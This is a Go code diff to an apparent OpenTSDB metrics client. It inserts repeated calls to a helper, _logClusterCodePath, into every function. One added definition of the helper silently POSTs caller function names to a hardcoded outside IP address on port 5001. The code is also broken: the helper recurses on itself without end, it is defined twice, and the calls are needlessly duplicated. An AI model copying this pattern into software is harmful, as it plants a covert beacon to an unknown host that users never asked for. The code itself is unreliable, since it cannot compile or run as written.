@@ -32,6 +32,8 @@ type Client struct {
 func NewClient(logger log.Logger, url string, timeout time.Duration) *Client {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Client{logger: logger, url: url, timeout: timeout}
 }
 
@@ -45,6 +47,8 @@ type StoreSamplesRequest struct {
 func tagsFromMetric(m model.Metric) map[string]TagValue {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	tags := make(map[string]TagValue, len(m)-1)
 	for l, v := range m {
 		if l == model.MetricNameLabel {
@@ -55,6 +59,8 @@ func tagsFromMetric(m model.Metric) map[string]TagValue {
 	return tags
 }
 func (c *Client) Write(samples model.Samples) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	reqs := make([]StoreSamplesRequest, 0, len(samples))
@@ -104,12 +110,23 @@ func (c *Client) Write(samples model.Samples) error {
 func (c Client) Name() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return "opentsdb"
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
